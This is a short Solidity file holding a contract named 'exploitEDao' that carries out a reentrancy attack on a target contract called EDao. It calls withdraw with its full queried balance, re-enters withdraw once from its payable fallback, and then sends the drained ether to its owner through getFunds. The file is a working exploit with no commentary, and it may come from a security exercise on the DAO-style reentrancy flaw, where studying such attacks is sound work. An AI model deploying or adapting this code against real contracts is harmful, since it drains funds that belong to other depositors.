pragma solidity ^0.5.4;

contract EDao {
    
    function withdraw(address payable addr,uint256 amount) public returns (bool) {}
    
    function queryFunds(address addr) public view returns (uint256) {}
    
}

contract exploitEDao {
    
    address payable public owner;
    bool performAttack = true;

    EDao deployedContract;
    address public EDao_address;
    
    mapping (address => uint) private balances;
    
    constructor () public {
       owner = msg.sender;
    }
    
    function existingEDao(address _t) public {
        deployedContract = EDao(_t);
        EDao_address = _t;
    }
    
    function attackEDAO() public  {
        deployedContract.withdraw(address(uint160(address(this))), deployedContract.queryFunds(address(uint160(address(this)))));
    }

    function () external payable { 
        if(performAttack==true) {
            performAttack = false;
            deployedContract.withdraw(address(uint160(address(this))), deployedContract.queryFunds(address(uint160(address(this)))));
        }
    }

    function getFunds() public { 
        owner.transfer(address(uint160(address(this))).balance); 
    }
}